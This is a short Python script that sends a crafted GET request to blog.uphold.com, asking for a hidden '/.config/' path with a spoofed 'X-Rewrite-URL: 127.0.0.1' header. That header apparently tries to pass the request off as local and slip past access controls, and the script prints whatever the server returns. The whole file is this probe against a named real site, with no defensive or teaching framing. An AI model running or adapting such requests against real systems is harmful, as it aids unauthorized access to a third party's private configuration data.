import http.client

conn = http.client.HTTPSConnection("blog.uphold.com")

headersList = {
 "Accept": "*/*",
 "User-Agent": "Thunder Client (https://www.thunderclient.com)",
 "X-Rewrite-URL": "127.0.0.1" 
}

payload = ""

conn.request("GET", "/.config/0e94750226374626aababa03aa6f12cf", payload, headersList)
response = conn.getresponse()
result = response.read()

print(result.decode("utf-8"))
